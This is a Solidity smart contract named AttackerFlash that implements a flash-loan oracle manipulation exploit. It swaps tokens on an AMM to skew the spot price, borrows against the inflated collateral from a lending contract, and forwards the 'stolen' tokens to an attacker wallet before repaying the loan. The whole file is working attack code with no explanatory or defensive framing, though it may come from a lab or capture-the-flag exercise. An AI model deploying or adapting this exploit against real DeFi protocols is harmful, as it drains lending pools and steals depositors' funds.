// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAMM {
    function swapAForB(uint256) external returns (uint256);
    function getSpotPrice() external view returns (uint256);
}

interface ILending {
    function borrow(uint256 amount) external;
    function collateralA(address) external view returns (uint256);
    function depositCollateral(uint256 amount) external;   // <-- FIX ADDED
}

contract AttackerFlash {
    IERC20 public tokenA;
    IERC20 public tokenB;
    IAMM public amm;
    ILending public lending;
    address public beneficiary;   // EOA attacker wallet

    constructor(
        address _a,
        address _b,
        address _amm,
        address _lending,
        address _beneficiary
    ) {
        tokenA = IERC20(_a);
        tokenB = IERC20(_b);
        amm = IAMM(_amm);
        lending = ILending(_lending);
        beneficiary = _beneficiary;
    }

    // -----------------------------------------
    // COLLATERAL DEPOSIT (BENEFICIARY ONLY)
    // -----------------------------------------
    function depositMyCollateral(uint256 amount) external {
        require(msg.sender == beneficiary, "only attacker");

        // pull A tokens from attacker EOA
        tokenA.transferFrom(msg.sender, address(this), amount);

        // approve lending contract to pull A
        tokenA.approve(address(lending), amount);

        // correct fix: call real deposit method
        lending.depositCollateral(amount);
    }

    // -----------------------------------------
    // MANUAL BORROW (BENEFICIARY ONLY)
    // -----------------------------------------
    function manualBorrow(uint256 amount) external {
        require(msg.sender == beneficiary, "only attacker");

        lending.borrow(amount);

        // send stolen B tokens to attacker
        uint256 bal = tokenB.balanceOf(address(this));
        if (bal > 0) {
            tokenB.transfer(beneficiary, bal);
        }
    }

    // -----------------------------------------
    // FLASHLOAN ENTRY POINT
    // -----------------------------------------
    function executeOperation(uint256 amount, bytes calldata) external {
        // 1. Approve and manipulate AMM price
        tokenA.approve(address(amm), amount);
        amm.swapAForB(amount);

        // 2. Compute borrowable value
        uint256 price = amm.getSpotPrice();
        uint256 coll = lending.collateralA(address(this));
        uint256 value = (coll * price) / 1e18;
        uint256 allowed = (value * 5000) / 10000;

        // 3. Borrow based on manipulated price
        lending.borrow(allowed);

        // 4. Send stolen B to attacker EOA
        uint256 profit = tokenB.balanceOf(address(this));
        if (profit > 0) {
            tokenB.transfer(beneficiary, profit);
        }

        // 5. Repay flash loan
        uint256 fee = (amount * 5) / 10000;
        tokenA.transfer(msg.sender, amount + fee);
    }
}
